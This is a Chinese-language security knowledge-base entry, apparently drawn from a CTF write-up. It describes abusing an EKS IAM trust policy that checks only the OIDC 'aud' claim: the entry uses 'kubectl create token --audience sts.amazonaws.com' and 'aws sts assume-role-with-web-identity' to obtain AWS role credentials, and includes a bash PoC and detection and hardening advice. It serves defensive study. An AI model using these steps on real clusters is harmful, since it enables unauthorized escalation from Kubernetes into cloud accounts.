---
id: cloud-k8s-eks-oidc-sa-token-assume-role
title: EKS OIDC 信任策略只校验 aud + serviceaccounts/token create：创建 SA token 经 AssumeRoleWithWebIdentity 换取 AWS 角色
type: scenario
domain: cloud
path: cloud/k8s
technique: eks-oidc-sa-token-web-identity-assume-role
aliases:
- EKS IRSA 滥用
- AssumeRoleWithWebIdentity K8s
- serviceaccounts/token 提权
- kubectl create token audience sts.amazonaws.com
- OIDC 信任策略缺少 sub 条件
tags:
- kubernetes
- eks
- aws
- oidc
- irsa
- iam
- token
- privilege-escalation
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V623
  verified_at: '2026-11-12T22:04:07+08:00'
  notes: 已对照原文与全部14张截图核对：原文 Trust Policy 仅 StringEquals aud=sts.amazonaws.com、无 sub 条件（正文）；图09 显示 serviceaccounts/token create 的 resourceNames 为 debug-sa；图10/11 为未加/加上 --audience sts.amazonaws.com 的 JWT，iss 为集群 OIDC provider、sub=system:serviceaccount:challenge5:debug-sa、aud 由 kubernetes.default.svc 变为 sts.amazonaws.com；图12 为 assume-role-with-web-identity 返回 AssumedRole challengeEksS3Role、Audience sts.amazonaws.com；图13 s3 cp 取 flag。修正两处：(1) 原文'可为一任意 SA 申领 token'与图09 resourceNames 限于 debug-sa 矛盾，已改为'为自己有权申领的 SA 创建 token'；(2) 'STS 只接受 aud=sts.amazonaws.com'改为'该角色信任策略要求 aud=sts.amazonaws.com'。与 cloud-cicd-gitlab-oidc-wildcard-sub-aws-role-assumption（GitLab 平台/令牌格式不同）及 workload-compromise（TokenRequest→K8s 高权 SA，非 SA→AWS 角色）均非同链；dedup recommendation=new、dup-scan 无配对。无 affected_versions。未独立复现。
---

## 一句话结论

当 IAM 角色的信任策略只校验 OIDC 的 `aud` 而不校验 `sub`，且当前身份拥有 `serviceaccounts/token create`（或本身就是被信任的 SA）时，可以用 `kubectl create token <sa> --audience sts.amazonaws.com` 生成 `aud=sts.amazonaws.com` 的 SA JWT，再用 `aws sts assume-role-with-web-identity` 换取该 AWS 角色的临时凭据，从集群内部横向到云权限。

## 原理

- **EKS OIDC 提供商**：每个 EKS 集群有 `oidc.eks.<region>.amazonaws.com/id/<id>` 的 OIDC issuer；IRSA 让 SA 的 projected token 作为 web identity 去 STS 换 IAM 角色。
- **TokenRequest**：`kubectl create token <sa>` 走 TokenRequest API，签发 JWT，payload 中 `iss` 为集群 OIDC issuer、`sub` 为 `system:serviceaccount:<ns>:<sa>`、`aud` 默认为 `https://kubernetes.default.svc`，可用 `--audience` 指定。该角色的信任策略要求 `aud=sts.amazonaws.com`——原文第一次未加 audience，token 无法用于 AWS，补上后成功。
- **信任策略缺陷**：给出的 trust policy 条件是 `StringEquals: oidc...:aud = sts.amazonaws.com`，**没有 `sub` 或 `namespace/serviceaccount` 条件**。这意味着该 OIDC provider 下任何 SA（任意命名空间、任意名字）签发的、aud 正确的 token 都能 assume 该角色。
- **权限组合**：RBAC 允许 `serviceaccounts/token create`（案例中 resourceNames 限定为 `debug-sa`）时，攻击者可为自己有权申领的 SA 创建 token；即使该 SA（及其命名空间）并非角色原本绑定的业务 SA，由于信任策略不校验 sub，它签发的 aud 正确的 token 同样能 assume 该角色。
- 角色策略（本例仅为指定 S3 桶的 GetObject/ListBucket）决定了最终危害；换到凭据后即可读 S3 对象等。

## 触发条件

- 集群配置了 OIDC provider 且存在可通过 web identity 承担的角色。
- 角色的信任策略缺少 `sub` 限制（或限制过宽，如只匹配前缀、允许任意 SA）。
- 攻击者拥有 `serviceaccounts/token` 的 `create` 权限（或可直接读取/使用目标 SA 的 token）。
- STS 端点可达（云上环境默认可达）。

## 利用步骤

1. 枚举权限：`kubectl auth can-i --list`，确认 `serviceaccounts/token [create]` 与可操作的 SA。
2. 创建带 STS audience 的 token：
   `kubectl create token <sa> --audience sts.amazonaws.com`。
3. 解析 JWT 确认 `iss`（集群 OIDC provider）、`sub`、`aud`。
4. 用 token 承担角色：
   `aws sts assume-role-with-web-identity --role-arn <role> --role-session-name <name> --web-identity-token <jwt>`。
5. 导出临时凭据，按角色权限访问资源：
   `aws sts get-caller-identity`、`aws s3 cp s3://<bucket>/flag .`。
6. 若角色权限更大，继续做 IAM 枚举与横向。

## PoC

```bash
# 1) 权限与 SA
kubectl auth can-i --list
kubectl get serviceaccounts

# 2) 关键：audience 必须是 sts.amazonaws.com
TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)

# 3) JWT 解码确认（可选）
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# 4) 换 AWS 角色
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<account>:role/<role> \
  --role-session-name test \
  --web-identity-token "$TOKEN"

# 5) 使用返回的 AccessKeyId/SecretAccessKey/SessionToken
aws s3 cp s3://<bucket>/flag ./flag
```

## 变体与关联

- 变体：角色信任策略用 `StringLike` 允许 `system:serviceaccount:prod:*`，则生产命名空间内任意 SA 都能 assume；若允许 `*` 则全集群可用。
- 变体：Pod 自身的 projected SA token 已配置 `audience: sts.amazonaws.com` 时，直接读取挂载的 token 即可，无需 TokenRequest 权限。
- 关联：[[cloud-k8s-eks-node-role-get-token-privesc]]（Pod→节点角色方向）、[[cloud-cicd-gitlab-oidc-wildcard-sub-aws-role-assumption]]（同类的 OIDC sub 通配缺陷，GitLab CI 场景）、[[cloud-k8s-workload-compromise-identity-expansion-privileged-pod]]（含 TokenRequest 的完整身份链）。
- 边界：信任策略同时校验精确 `sub` 且 TokenRequest 权限受限时，本手法失效；STS 端点在受限网络中不可达时也无法换取。

## 检测与防御

- IAM trust policy 必须同时校验 `aud` 与精确的 `sub`（`system:serviceaccount:<ns>:<sa>`），禁止通配；每个角色只绑定一个 SA。
- RBAC 最小化：`serviceaccounts/token create` 是高危权限，只授予确实需要的控制器；用 `resourceNames` 限定到具体 SA。
- 检测：CloudTrail 中 `AssumeRoleWithWebIdentity` 的 `subjectFromWebIdentityToken` 与角色预期的 SA 不匹配；集群审计日志中 `serviceaccounts/token` create 请求来自非常规主体。
- 加固：启用 EKS Pod Identity 等更受控的机制；定期审计角色信任策略与 OIDC provider。
